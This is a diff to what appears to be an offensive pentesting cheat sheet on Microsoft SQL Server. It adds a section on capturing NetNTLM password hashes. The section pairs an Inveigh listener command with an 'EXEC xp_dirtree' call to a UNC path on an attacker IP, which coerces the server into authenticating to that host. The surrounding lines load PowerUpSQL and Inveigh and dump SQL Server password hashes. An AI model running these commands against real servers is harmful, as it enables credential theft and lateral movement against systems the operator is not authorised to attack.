@@ -1884,8 +1884,15 @@ SELECT * FROM OPENQUERY("sql-1.test.io", 'select * from openquery("sql01.test.lo
 
 #### UNC PATH INJECTION
 - Public role has access to xp_dirtree and xp_fileexists to abuse UNC PATH INJECTION
-
+- https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e
+ 
 #### Capture NetNTLM password hash
+```
+.\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N
+EXEC xp_dirtree '\\<IP>\pwn', 1, 1
+```
+ 
+#### Capture NetNTLM password hash2
 ```
 import-module .\PowerUpSQL.ps1
 Import-Module \Scripts\3rdparty\Inveigh.ps1
@@ -1906,7 +1913,6 @@ run
 ```
 Get-SQLServerPasswordHash -Verbose -Instance <INSTANCE> -Migrate
 ```
-
  
 #### Identify Sensitive Data
 ```
